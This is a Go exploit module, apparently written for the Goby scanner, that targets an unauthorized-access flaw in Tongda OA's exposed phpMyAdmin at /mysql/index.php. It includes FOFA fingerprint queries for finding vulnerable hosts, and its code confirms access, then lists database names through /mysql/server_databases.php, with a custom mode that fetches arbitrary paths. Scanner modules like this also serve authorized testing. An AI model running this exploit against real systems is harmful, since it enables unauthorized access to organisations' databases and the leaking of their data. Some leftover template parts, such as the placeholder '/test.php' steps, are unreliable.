package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TongdaOA /mysql/index.php Unauthorized Access Vulnerability",
    "Description": "<p>Tongda OA (0fice Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Tongda Xinke Technology. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices. Tongda OA provides information management capabilities for many users of different sizes in various industries, including process approval, administrative office, daily affairs, data statistics and analysis, instant messaging, mobile office, etc., helping users reduce communication and management costs and improve production and decision-making efficiency. Tongda OA /mysql/index.php has unauthorized access. Attackers can directly access the system's phpmyadmin without an account and password, causing sensitive information leakage.</p>",
    "Product": "Tongda-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2024-09-13",
    "PostTime": "2024-09-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "GobyQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "Level": "2",
    "Impact": "<p>Tongda OA /mysql/index.php has unauthorized access. Attackers can directly access the system's phpmyadmin without an account and password, causing sensitive information leakage.</p>",
    "Recommendation": "<p>1. Deploy a Web application firewall. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "db_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "2H1W"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "通达OA /mysql/index.php 未授权访问漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA (0fice Anywhere网络智能办公系统)是由通达信科科技自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA /mysql/index.php存在未授权访问，攻击者可以不需要账号密码直接访问系统的phpmyadmin，造成敏感信息泄露。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>通达OA /mysql/index.php存在未授权访问，攻击者可以不需要账号密码直接访问系统的phpmyadmin，造成敏感信息泄露。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TongdaOA /mysql/index.php Unauthorized Access Vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Tongda OA (0fice Anywhere Network Intelligent Office System) is a collaborative office automation software independently developed by Tongda Xinke Technology. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices. Tongda OA provides information management capabilities for many users of different sizes in various industries, including process approval, administrative office, daily affairs, data statistics and analysis, instant messaging, mobile office, etc., helping users reduce communication and management costs and improve production and decision-making efficiency. Tongda OA /mysql/index.php has unauthorized access. Attackers can directly access the system's phpmyadmin without an account and password, causing sensitive information leakage.<br></p>",
            "Recommendation": "<p>1. Deploy a Web application firewall.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Tongda OA /mysql/index.php has unauthorized access. Attackers can directly access the system's phpmyadmin without an account and password, causing sensitive information leakage.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9956"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/mysql/index.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/mysql/index.php": "phpMyAdmin 更适合在支持",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"db_info": {"/mysql/server_databases.php", ""},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			regular := `target="_parent">([^<]+)<\/a>`

			makeRegular := func(RegularContent string, RegularUrl string) ([]string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return nil, fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				if len(getname) == 0 {
					return nil, fmt.Errorf("can't match value")
				}

				var results []string
				for _, v := range getname {
					noSpace := strings.TrimSpace(v[1])
					results = append(results, noSpace)
				}
				return results, nil
			}

			output, err := makeRegular(resp, regular)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				expResult.Output = "正则匹配失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output = "泄露的数据库名：\n"
			for _, v := range output {
				expResult.Output += v + "\n"
			}
			return expResult
		},
	))
}
